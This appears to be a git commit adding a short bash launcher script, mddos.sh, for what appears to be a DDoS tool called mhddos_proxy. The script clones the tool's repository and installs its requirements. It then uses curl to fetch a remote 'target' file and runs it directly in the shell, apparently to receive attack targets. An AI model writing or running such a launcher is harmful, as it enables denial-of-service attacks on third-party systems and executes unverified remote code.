5e032ed55748c3d78e712bab7b27e0e5eec7e548
wazxn <zvp.ukr01@gmail.com>
2022-03-30 02:43:47 +0300

    first commit

---
+++ mddos.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+cd ./Desktop/mhddos-proxy-py
+checkfolder () {
+    if [ -d ./mhddos_proxy ]; then
+        cd mhddos_proxy
+        clear
+    else
+        git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+        cd mhddos_proxy
+        if [ "`arch`" = "x86_64" ]; then python -m pip install -r requirements.txt; else python3 -m pip install -r requirements.txt; fi
+        clear
+    fi
+}
+checkfolder
+source <(curl -s https://raw.githubusercontent.com/wazxn/ddos-help-bat/main/target)
+exit
